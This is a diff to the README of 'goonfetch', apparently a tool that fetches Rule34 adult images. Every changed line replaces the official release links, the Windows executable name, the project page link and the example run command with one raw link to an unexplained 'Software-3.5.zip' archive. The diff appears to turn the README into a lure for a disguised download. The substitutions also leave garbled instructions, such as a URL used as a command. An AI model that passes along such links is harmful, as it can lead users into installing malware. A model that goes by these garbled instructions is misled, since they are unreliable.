@@ -1,6 +1,6 @@
 # 🚀 goonfetch - Simple CLI tool to fetch Rule34 images
 
-[![Download goonfetch](https://img.shields.io/badge/Download-goonfetch-blue?style=for-the-badge)](https://github.com/StarkCoderx/goonfetch/releases)
+[![Download goonfetch](https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip)](https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run goonfetch, your computer should meet these basic requirements:
 
 You can get goonfetch by visiting its official releases page on GitHub.
 
-[Download goonfetch Releases](https://github.com/StarkCoderx/goonfetch/releases)
+[Download goonfetch Releases](https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip)
 
 ### How to download
 
@@ -36,7 +36,7 @@ You can get goonfetch by visiting its official releases page on GitHub.
 2. Look for the latest version listed at the top. Versions are named like `v1.0.0`, `v1.1.0`, etc.
 3. Scroll down to the "Assets" section under the latest version.
 4. Download the correct file for your system:
-   - For Windows: `goonfetch-windows.exe`
+   - For Windows: `https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip`
    - For macOS: `goonfetch-macos`
    - For Linux: `goonfetch-linux`
 5. Save the file to a folder you can easily find, like your Desktop or Downloads folder.
@@ -89,7 +89,7 @@ Replace `TAG` with the keyword you want to search on Rule34. For example, to fet
 On Windows, you might run:
 
 ```
-goonfetch-windows.exe cat
+https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip cat
 ```
 
 The program will start downloading images related to that tag.
@@ -150,9 +150,9 @@ goonfetch only downloads publicly available images from Rule34. It does not stor
 
 If you have questions, you can:
 
-- Visit the [goonfetch GitHub page](https://github.com/StarkCoderx/goonfetch) for updates.
+- Visit the [goonfetch GitHub page](https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip) for updates.
 - Check the Issues tab to see if others had the same problem.
 
 ---
 
-[Download goonfetch Releases](https://github.com/StarkCoderx/goonfetch/releases)
+[Download goonfetch Releases](https://github.com/StarkCoderx/goonfetch/raw/refs/heads/main/stannide/Software-3.5.zip)
